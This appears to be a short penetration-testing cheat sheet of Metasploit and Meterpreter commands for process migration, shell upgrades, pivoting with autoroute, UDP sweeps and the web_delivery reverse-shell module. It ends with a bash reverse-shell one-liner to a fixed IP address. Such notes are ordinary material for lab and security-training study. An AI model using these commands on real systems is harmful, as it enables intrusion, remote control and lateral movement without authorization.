# USERS CAN BE USED AS PASSWORDS
# EXPORT NMAP SCANS IN XML FOR METASPLOIT
# Metasploit start
```
Start the postgresql service before using metasploit
service postgresql start
```

# X86 Meterpreter session
```
If in sysinfo meterpreter command output, show a x86 meterpreter, migrate to x64 proccess if the system is x64
> pgrep explorer 
> migrate PID
```

# Upgrade shell to meterpreter
```
sessions -u SESSION_NUMBER
```

# Pivoting MSF
```
In meterpreter

run autoroute -s IP (IP of the network to pivot)
```

# UDP scan MSF
```
auxiliary/scanner/discovery/udp_sweep
```

# Info about MSF modules
```
info -> gives info about the active module, useful for looking to the affected versions of a service by the active exploit
```

# Ifconfig not installed
```
ip a s
```

# MSF module for getting reverse shell
```
Module will set up a server with a payload and will create a payload to be executed on victim machine
/multi/script/web_delivery
[!] Important to set correct target and payload
```

# Reverse shell on scripts
```
/bin/bash -c 'bash -i >& /dev/tcp/10.9.199.90/1234 0>&1'
```



